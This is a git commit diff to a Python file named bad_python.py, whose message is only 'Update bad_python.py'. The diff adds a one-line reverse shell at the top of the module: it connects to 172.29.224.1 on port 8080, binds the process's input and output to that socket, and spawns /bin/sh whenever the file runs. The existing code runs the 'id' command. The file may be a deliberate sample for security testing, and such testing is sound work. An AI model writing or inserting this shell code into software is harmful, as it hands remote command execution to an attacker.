2a29a15420392d4cbcde87f3ca0bf71a46c4d112
Uzo Ogbonna <younguzii@yahoo.com>
2022-05-02 06:19:31 +0300

    Update bad_python.py

--- bad_python.py
+++ bad_python.py
@@ -1,6 +1,11 @@
 import json
 import os
 
+
+
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.29.224.1",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+
+
 stream = os.popen('id')
 output = stream.read()
 result = {"result": output}
